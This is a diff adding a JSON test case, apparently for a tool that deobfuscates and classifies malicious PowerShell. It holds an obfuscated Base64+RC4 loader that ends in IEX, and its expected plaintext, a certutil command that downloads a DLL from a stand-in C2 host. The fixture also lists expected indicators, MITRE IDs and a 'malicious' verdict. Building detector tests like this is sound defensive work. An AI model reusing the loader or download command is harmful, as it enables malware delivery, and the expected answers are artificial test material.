@@ -1,0 +1,41 @@
+{
+  "id": "b64-rc4-inline-1",
+  "category": "ps-crypto",
+  "algorithm": "Base64+RC4",
+  "command_line": "$k=[Text.Encoding]::UTF8.GetBytes('NivXWrap'); $c=[Convert]::FromBase64String('BxWCo+w6Kw8O6jvarzRZiqoLhPbo9Fu2ZHeNqDbjAx5jypPLFRHhreSrqoQKeqQ28k2bJg=='); $S=(0..255); $j=0; for($i=0;$i -lt 256;$i++){$j=($j+$S[$i]+$k[$i%$k.Length])%256; $t=$S[$i];$S[$i]=$S[$j];$S[$j]=$t}; $out=New-Object byte[] $c.Length; $ii=0;$jj=0; for($n=0;$n -lt $c.Length;$n++){$ii=($ii+1)%256;$jj=($jj+$S[$ii])%256; $t=$S[$ii];$S[$ii]=$S[$jj];$S[$jj]=$t; $out[$n]=$c[$n] -bxor $S[($S[$ii]+$S[$jj])%256]}; IEX ([Text.Encoding]::UTF8.GetString($out))",
+  "stage_ladder": [
+    {
+      "name": "base64-decode",
+      "recoverable": true,
+      "reason": ""
+    },
+    {
+      "name": "rc4-decrypt-inline-key",
+      "recoverable": true,
+      "reason": ""
+    },
+    {
+      "name": "utf8-decode",
+      "recoverable": true,
+      "reason": ""
+    }
+  ],
+  "key_status": "inline-static",
+  "expected_plaintext": "certutil -urlcache -f http://c2.io/x.dll %tmp%\\x.dll",
+  "expected_iocs": [
+    "certutil -urlcache -f http://c2.io/x.dll %tmp%\\x.dll"
+  ],
+  "expected_lolbins": [
+    "powershell.exe"
+  ],
+  "expected_mitre": [
+    "T1027",
+    "T1140",
+    "T1059.001"
+  ],
+  "expected_verdict": "malicious",
+  "expected_confidence_min": 0.85,
+  "notes": "",
+  "source": "nivxray-rc41-crypto",
+  "license": "CC-BY-4.0"
+}
